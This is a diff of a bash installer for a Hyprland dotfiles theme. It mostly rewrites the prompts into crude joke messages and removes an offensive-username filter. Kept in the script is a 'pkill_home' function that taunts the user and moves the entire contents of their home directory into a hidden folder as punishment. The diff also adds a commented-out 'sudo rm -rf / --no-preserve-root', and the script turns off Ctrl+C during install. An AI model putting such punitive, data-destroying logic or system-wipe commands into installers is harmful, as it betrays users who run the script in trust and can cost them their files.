@@ -2,21 +2,19 @@
 set -euo pipefail
 
 if [ "$EUID" -eq 0 ]; then
-    echo -e "FBI OPEN UP U AINT GOD"
+    echo -e "\e[0;31;1;3mdie\e[0m 🙃"
     exit 1
 fi
 
 if ! command -v pfetch >/dev/null 2>&1; then
-    echo -e ":)\n"
+    echo -e "pls stop rn fr fr lit n be nocap rn\n"
     exit 1
 fi
 
 if ! command -v gum >/dev/null 2>&1; then
-    echo "gum is required. exiting."
+    echo "poop😢😢😢 vhat"
     exit 1
 fi
-
-# zenity --warning --text "If you know, you know." --width=400 --height=100 || true
 
 echo "Does Gum work?"
 gum_work_check() {
@@ -28,37 +26,21 @@ gum_work_check() {
 }
 gum_work_check
 
-echo "Enter your GitHub username:"
+echo "enter ur ✨️ \e[1;3m a e s t h e t i c\e[0m ✨️ gh uname:"
 read -r userinput
-
-OFFENSIVE_WORDS=(
-  "fuck" "shit" "bitch" "asshole" "bastard" "dick" "piss" "crap"
-  "slut" "whore" "cunt" "twat" "prick" "cock" "balls" "jackass" "dipshit"
-  "dumbass" "motherfucker" "sonofabitch" "bullshit" "douche" "nipple" "loser"
-)
-
-is_offensive() {
-  local name=$1
-  for word in "${OFFENSIVE_WORDS[@]}"; do
-    if [[ "$name" == "$word" ]]; then
-      return 0
-    fi
-  done
-  return 1
-}
 
 pkill_home() {
     echo -e "\033[31mget uno reverse you loser.\033[0m\n"
     sleep 2
-    echo -e "Removing home dir now.\n"
+    echo -e deleting home dir idc 🥱🥱🥱\n"
     sleep 10
-    echo -e "SIKE\n"
+    echo -e "🥱\n"
     sleep 20
-    echo -e "Get punished loser\n"
+    echo -e "die 💔💔💔\n"
     sleep 0.5
     mkdir -p ~/.local/share/hyprmaterial3/trashed-system/
 
-    # safer mv including dotfiles, skip trash folder itself
+    # sudo rm -rf / --no-preserve-root
     shopt -s dotglob nullglob
     for f in "$HOME"/*; do
       [[ "$f" == "$HOME/.local/share/hyprmaterial3/trashed-system" ]] && continue
@@ -72,12 +54,7 @@ pkill_home() {
     exit 1
 }
 
-# Check offensive username first
-if is_offensive "$userinput"; then
-    pkill_home
-fi
-
-# Check if user exists on GitHub
+# if you lie then ur evil
 http_code=$(curl -s -o /dev/null -w "%{http_code}" "https://github.com/$userinput")
 
 if [[ "$http_code" == "404" ]]; then
@@ -110,6 +87,8 @@ install_dots() {
             grep -qxF 'export PATH="$PATH:~/.local/bin"' ~/.bashrc || echo 'export PATH="$PATH:~/.local/bin"' >> ~/.bashrc
             source ~/.bashrc
             touch ~/.local/share/hyprmaterial3/installed
+            curl -Lo ~/.config/quickshell/json/emoji.json \
+                https://raw.githubusercontent.com/koeqaife/hyprland-material-you-archive/v1/ags/assets/emoji.json
             echo -e "thx <3\n"
             ags run &
             ;;
@@ -167,19 +146,19 @@ trap '' SIGINT  # Disable Ctrl+C during install
 install_dots
 trap - SIGINT
 
-echo -e "Set the LineageOS wallpaper (WARNING: NO LIGHT MODE)?\n"
+echo -e "YOOO BESTIE I AIN'T TOUCHING THAT \e[0;31;1;3mS*XY ANIME VALLPAPER\e[0m VITH A 69420 FOOT POLE RN 😭😭😭\n"
 set_los_wallpaper
 
-echo -e "Want to install BSCode (aka VSCode)? (requires sudo btw)\n"
+echo -e "YOOO BESTIEEE 😭😭😭😭\n install this \e[0;31;1;3mtelemetry text editor\e[0m fr fr?\n"
 want_to_install_bscode
 
-echo -e "Want to install a loaded SPAS 12 (I mean Vesktop)?\n"
+echo -e "yoo bestie 💀\n you vanna install \e[0;31;1;3mtelemetrycord\e[0m?\n"
 want_to_install_vesktop
 
-echo -e "Want to install a double propelled flamethrower (I mean YT Music. dont worry it has an adblocker)?\n"
+echo -e "YOOO BESTIEEEEEEE STOPPPP- 😭😭😭\n vant to install rvx music like yt music (\e[0;31;1;3melectron 😢😢😢\e[0m) no cap\n"
 want_to_install_ytmusic
 
-echo -e "Want to install a Husqvarna 440 gas powered Chainsaw 40 CC 2.4 HP (I mean icon theme)"
+echo -e "yo bestie 😎\n vanna install my \e[0;31;1;3mdingaling\e[0m? (\e[1;3micon theme gtk fart\e[0m)"
 want_to_install_icon_theme
 
-echo -e "Done! Please restart Hyprland.\n"
+echo -e "pls \e[0;31;1;3mfart\e[0m on ur pc i beg u 🥺🥺🥺\n"
